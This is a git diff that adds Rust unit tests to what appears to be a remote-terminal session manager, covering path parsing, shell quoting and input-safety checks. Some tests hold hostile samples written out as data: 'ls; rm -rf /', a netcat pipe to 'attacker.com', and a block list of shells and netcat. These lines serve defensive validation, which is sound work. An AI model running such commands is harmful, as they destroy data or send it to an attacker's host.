@@ -1500,10 +1500,11 @@ impl Default for SessionManager {
 mod tests {
     use super::*;
 
+    // ── resolve_directory_from_output ────────────────────────────────────────
+
     #[test]
     fn resolve_directory_supports_unique_prefix_directory_match() {
         let output = "igate-core\t/opt/igate-core\nlogs\t/opt/logs\n";
-
         assert_eq!(
             resolve_directory_from_output("/opt/igate", output),
             "/opt/igate-core"
@@ -1513,7 +1514,6 @@ mod tests {
     #[test]
     fn resolve_directory_supports_unique_fuzzy_directory_match() {
         let output = "igate-core\t/opt/igate-core\nigloo\t/opt/igloo\n";
-
         assert_eq!(
             resolve_directory_from_output("/opt/igc", output),
             "/opt/igate-core"
@@ -1523,10 +1523,300 @@ mod tests {
     #[test]
     fn resolve_directory_keeps_requested_path_when_fuzzy_match_is_ambiguous() {
         let output = "igate-core\t/opt/igate-core\nignore-cache\t/opt/ignore-cache\n";
-
         assert_eq!(
             resolve_directory_from_output("/opt/igc", output),
             "/opt/igc"
         );
+    }
+
+    #[test]
+    fn resolve_directory_returns_plain_path_for_non_tabbed_output() {
+        assert_eq!(
+            resolve_directory_from_output("/opt/myapp", "  /opt/myapp  \n"),
+            "/opt/myapp"
+        );
+    }
+
+    #[test]
+    fn resolve_directory_empty_output_returns_requested_path() {
+        assert_eq!(
+            resolve_directory_from_output("/opt/fallback", ""),
+            "/opt/fallback"
+        );
+    }
+
+    // ── parse_remote_directory ────────────────────────────────────────────────
+
+    #[test]
+    fn parse_remote_directory_parses_file_entry() {
+        let out = "f\t1024\t1700000000\treport.pdf\t/home/user/report.pdf\n";
+        let entries = parse_remote_directory("/home/user", out);
+        assert_eq!(entries.len(), 1);
+        assert_eq!(entries[0].name, "report.pdf");
+        assert_eq!(entries[0].path, "/home/user/report.pdf");
+        assert!(!entries[0].is_directory);
+        assert_eq!(entries[0].size_bytes, 1024);
+        assert_eq!(entries[0].modified_unix_seconds, 1700000000);
+    }
+
+    #[test]
+    fn parse_remote_directory_parses_directory_entry() {
+        let out = "d\t0\t1699000000\tsrc\t/home/user/src\n";
+        let entries = parse_remote_directory("/home/user", out);
+        assert_eq!(entries.len(), 1);
+        assert!(entries[0].is_directory);
+    }
+
+    #[test]
+    fn parse_remote_directory_sorts_dirs_before_files() {
+        let out = "f\t512\t0\treadme.txt\t/p/readme.txt\nf\t1024\t0\tmain.rs\t/p/main.rs\nd\t0\t0\tlib\t/p/lib\n";
+        let entries = parse_remote_directory("/p", out);
+        assert!(entries[0].is_directory, "directory must come first");
+    }
+
+    #[test]
+    fn parse_remote_directory_sorts_alphabetically_within_kind() {
+        let out = "f\t0\t0\tzebra.txt\t/p/zebra.txt\nf\t0\t0\tapple.txt\t/p/apple.txt\n";
+        let entries = parse_remote_directory("/p", out);
+        assert_eq!(entries[0].name, "apple.txt");
+        assert_eq!(entries[1].name, "zebra.txt");
+    }
+
+    #[test]
+    fn parse_remote_directory_empty_output_returns_empty_vec() {
+        assert!(parse_remote_directory("/home/user", "").is_empty());
+    }
+
+    #[test]
+    fn parse_remote_directory_skips_malformed_lines() {
+        assert!(parse_remote_directory("/p", "no tabs here\n").is_empty());
+    }
+
+    #[test]
+    fn parse_remote_directory_handles_fractional_timestamp() {
+        let out = "f\t512\t1700000000.123456789\tfile.txt\t/p/file.txt\n";
+        let entries = parse_remote_directory("/p", out);
+        assert_eq!(entries[0].modified_unix_seconds, 1700000000);
+    }
+
+    // ── parse_remote_system_snapshot ─────────────────────────────────────────
+
+    #[test]
+    fn parse_remote_system_snapshot_extracts_all_fields() {
+        let out = "OS=Ubuntu 22.04 LTS\nHOST=prod-01\nUPTIME=5 days\n\
+                   MEM_USED_BYTES=4096\nMEM_FREE_BYTES=2048\nMEM_TOTAL_BYTES=8192\n\
+                   DISK_USED_BYTES=10000\nDISK_FREE_BYTES=5000\nDISK_TOTAL_BYTES=15000\n";
+        let snap = parse_remote_system_snapshot(out);
+        assert_eq!(snap.os, "Ubuntu 22.04 LTS");
+        assert_eq!(snap.hostname, "prod-01");
+        assert_eq!(snap.uptime, "5 days");
+        assert_eq!(snap.memory_total_bytes, 8192);
+        assert_eq!(snap.disk_total_bytes, 15000);
+    }
+
+    #[test]
+    fn parse_remote_system_snapshot_defaults_zero_for_missing_fields() {
+        let snap = parse_remote_system_snapshot("OS=Linux\n");
+        assert_eq!(snap.memory_used_bytes, 0);
+        assert_eq!(snap.disk_total_bytes, 0);
+    }
+
+    #[test]
+    fn parse_remote_system_snapshot_empty_input() {
+        let snap = parse_remote_system_snapshot("");
+        assert!(snap.os.is_empty());
+        assert_eq!(snap.memory_total_bytes, 0);
+    }
+
+    // ── shell_quote ───────────────────────────────────────────────────────────
+
+    #[test]
+    fn shell_quote_simple_path() {
+        assert_eq!(shell_quote("/home/user"), "'/home/user'");
+    }
+
+    #[test]
+    fn shell_quote_empty_returns_home_var() {
+        assert_eq!(shell_quote(""), "\"$HOME\"");
+    }
+
+    #[test]
+    fn shell_quote_tilde_returns_home_var() {
+        assert_eq!(shell_quote("~"), "\"$HOME\"");
+    }
+
+    #[test]
+    fn shell_quote_dot_returns_dot() {
+        assert_eq!(shell_quote("."), "\".\"");
+    }
+
+    #[test]
+    fn shell_quote_path_with_single_quote_escapes() {
+        let result = shell_quote("/home/o'malley");
+        assert!(result.contains("'\"'\"'"), "single quote not escaped: {result}");
+    }
+
+    // ── contains_shell_control ────────────────────────────────────────────────
+
+    #[test]
+    fn shell_control_detects_semicolon() {
+        assert!(contains_shell_control("ls; rm -rf /"));
+    }
+
+    #[test]
+    fn shell_control_detects_pipe() {
+        assert!(contains_shell_control("cat | nc attacker.com 80"));
+    }
+
+    #[test]
+    fn shell_control_detects_dollar_sign() {
+        assert!(contains_shell_control("$HOME"));
+    }
+
+    #[test]
+    fn shell_control_safe_for_normal_command() {
+        assert!(!contains_shell_control("git status --verbose"));
+    }
+
+    // ── is_safe_command_name ──────────────────────────────────────────────────
+
+    #[test]
+    fn safe_command_name_accepts_typical_commands() {
+        assert!(is_safe_command_name("git"));
+        assert!(is_safe_command_name("docker-compose"));
+        assert!(is_safe_command_name("kubectl"));
+    }
+
+    #[test]
+    fn safe_command_name_rejects_empty() {
+        assert!(!is_safe_command_name(""));
+    }
+
+    #[test]
+    fn safe_command_name_rejects_slash() {
+        assert!(!is_safe_command_name("/usr/bin/git"));
+    }
+
+    #[test]
+    fn safe_command_name_rejects_too_long() {
+        assert!(!is_safe_command_name(&"a".repeat(65)));
+    }
+
+    #[test]
+    fn safe_command_name_rejects_space() {
+        assert!(!is_safe_command_name("my command"));
+    }
+
+    // ── is_allowed_help_command ───────────────────────────────────────────────
+
+    #[test]
+    fn allowed_help_blocks_dangerous_commands() {
+        for cmd in &["bash", "sh", "python", "python3", "sudo", "su", "nc", "netcat"] {
+            assert!(!is_allowed_help_command(cmd), "{cmd} should be blocked");
+        }
+    }
+
+    #[test]
+    fn allowed_help_passes_safe_commands() {
+        assert!(is_allowed_help_command("git"));
+        assert!(is_allowed_help_command("kubectl"));
+        assert!(is_allowed_help_command("docker"));
+    }
+
+    // ── is_sensitive_autocomplete ─────────────────────────────────────────────
+
+    #[test]
+    fn sensitive_autocomplete_detects_password() {
+        assert!(is_sensitive_autocomplete("mysql --password=secret"));
+    }
+
+    #[test]
+    fn sensitive_autocomplete_detects_token() {
+        assert!(is_sensitive_autocomplete("export TOKEN=abc"));
+    }
+
+    #[test]
+    fn sensitive_autocomplete_safe_for_normal_commands() {
+        assert!(!is_sensitive_autocomplete("git status --verbose"));
+        assert!(!is_sensitive_autocomplete("ls -la /etc"));
+    }
+
+    #[test]
+    fn sensitive_autocomplete_case_insensitive() {
+        assert!(is_sensitive_autocomplete("--PASSWORD=x"));
+        assert!(is_sensitive_autocomplete("--SECRET=y"));
+    }
+
+    // ── HelpSuggestionRequest::parse ─────────────────────────────────────────
+
+    #[test]
+    fn help_suggestion_parse_returns_none_for_empty() {
+        assert!(HelpSuggestionRequest::parse("").is_none());
+    }
+
+    #[test]
+    fn help_suggestion_parse_returns_none_for_single_char() {
+        assert!(HelpSuggestionRequest::parse("g").is_none());
+    }
+
+    #[test]
+    fn help_suggestion_parse_returns_none_for_shell_control() {
+        assert!(HelpSuggestionRequest::parse("ls; rm").is_none());
+    }
+
+    #[test]
+    fn help_suggestion_parse_completing_command_when_single_token() {
+        let req = HelpSuggestionRequest::parse("gi").unwrap();
+        assert!(req.completing_command);
+        assert_eq!(req.command, "gi");
+    }
+
+    #[test]
+    fn help_suggestion_parse_completing_option_with_dash() {
+        let req = HelpSuggestionRequest::parse("git --verb").unwrap();
+        assert!(req.completing_option);
+        assert_eq!(req.current_token, "--verb");
+    }
+
+    #[test]
+    fn help_suggestion_parse_includes_subcommand_in_tokens() {
+        let req = HelpSuggestionRequest::parse("git commit --").unwrap();
+        assert_eq!(req.help_tokens, vec!["git", "commit"]);
+    }
+
+    #[test]
+    fn help_suggestion_parse_trailing_space_not_completing_command() {
+        let req = HelpSuggestionRequest::parse("git ").unwrap();
+        assert!(!req.completing_command);
+        assert_eq!(req.current_token, "");
+    }
+
+    // ── completion_item_from_wire ─────────────────────────────────────────────
+
+    #[test]
+    fn completion_item_parses_portix_completion_format() {
+        let wire = "PORTIX_COMPLETION\tgit status\tgit status\tshow working tree\tcommand";
+        let item = completion_item_from_wire(wire).unwrap();
+        assert_eq!(item.insert_text, "git status");
+        assert!(matches!(item.kind, CompletionKind::Command));
+    }
+
+    #[test]
+    fn completion_item_fallback_plain_text() {
+        let item = completion_item_from_wire("some-command").unwrap();
+        assert_eq!(item.insert_text, "some-command");
+        assert!(matches!(item.kind, CompletionKind::History));
+    }
+
+    #[test]
+    fn completion_item_returns_none_for_empty_replacement() {
+        assert!(completion_item_from_wire("PORTIX_COMPLETION\t\t\t\t").is_none());
+    }
+
+    #[test]
+    fn completion_item_maps_path_kind() {
+        let wire = "PORTIX_COMPLETION\t/etc/hosts\t/etc/hosts\thosts file\tpath";
+        let item = completion_item_from_wire(wire).unwrap();
+        assert!(matches!(item.kind, CompletionKind::Path));
     }
 }
